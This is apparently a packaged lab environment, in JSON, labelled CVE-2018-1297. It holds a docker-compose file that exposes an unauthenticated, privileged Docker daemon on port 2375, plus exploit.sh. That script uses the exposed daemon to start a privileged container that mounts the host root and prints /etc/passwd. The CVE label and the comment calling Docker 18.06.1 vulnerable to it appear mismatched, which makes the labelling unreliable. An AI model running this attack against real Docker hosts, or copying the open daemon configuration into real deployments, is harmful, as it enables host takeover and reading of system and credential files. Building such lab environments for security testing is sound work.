{
    "files": [
        {
            "location": "./../../dockers/CVE-2018-1297/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable_dind:\n    build:\n      context: ./vulnerable_dind\n      dockerfile: Dockerfile\n    privileged: true\n    command: [\"dockerd-entrypoint.sh\", \"dockerd\", \"-H\", \"tcp://0.0.0.0:2375\", \"-H\", \"unix:///var/run/docker.sock\"]\n    healthcheck:\n      test: [\"CMD\", \"docker\", \"info\"]\n      interval: 2s\n      timeout: 5s\n      retries: 20\n    volumes:\n      - dind-storage:/var/lib/docker\n    ports:\n      - \"2375:2375\"\n    environment:\n      - DOCKER_TLS_CERTDIR=\n  exploit_runner:\n    image: docker:18.06.1\n    privileged: true\n    cap_add:\n      - SYS_ADMIN\n    depends_on:\n      vulnerable_dind:\n        condition: service_healthy\n    volumes:\n      - ./exploit.sh:/exploit.sh:ro\n    entrypoint: [\"sh\", \"/exploit.sh\"]\n    environment:\n      - DOCKER_HOST=tcp://vulnerable_dind:2375\nvolumes:\n  dind-storage:\n"
        },
        {
            "location": "./../../dockers/CVE-2018-1297/custom_no_tool/vulnerable_dind/Dockerfile",
            "content": "FROM docker:18.06.1-dind\n# Docker 18.06.1-ce is the version known to be vulnerable to CVE-2018-1297\n# No additional hardening \u2013 the container runs with privileged flag to allow the exploit\n"
        },
        {
            "location": "./../../dockers/CVE-2018-1297/custom_no_tool/exploit.sh",
            "content": "#!/bin/sh\n# Export DOCKER_HOST explicitly so all docker commands target the vulnerable daemon\nexport DOCKER_HOST=tcp://vulnerable_dind:2375\n\n# Wait until the vulnerable Docker daemon is ready (healthcheck already ensures it, but keep a fallback)\nwhile ! docker info >/dev/null 2>&1; do\n  echo \"Waiting for vulnerable Docker daemon to become ready...\"\n  sleep 1\ndone\n\n# Pull a minimal image for the attacker container\ndocker pull alpine:3.12\n\n# Build the attack image using an inline Dockerfile, providing the current directory as the build context\ndocker build -t attack-image -f - . <<'EOF'\nFROM alpine:3.12\nRUN mkdir /hostfs\nEOF\n\n# Run the attack container, mounting the host root as read\u2011only and printing /etc/passwd\ndocker run --rm --privileged -v /:/hostfs:ro attack-image sh -c \"cat /hostfs/etc/passwd\"\n\n# If the exploit succeeds, the host's /etc/passwd will be printed.\n"
        }
    ],
    "directory_tree": "./../../dockers/CVE-2018-1297/custom_no_tool"
}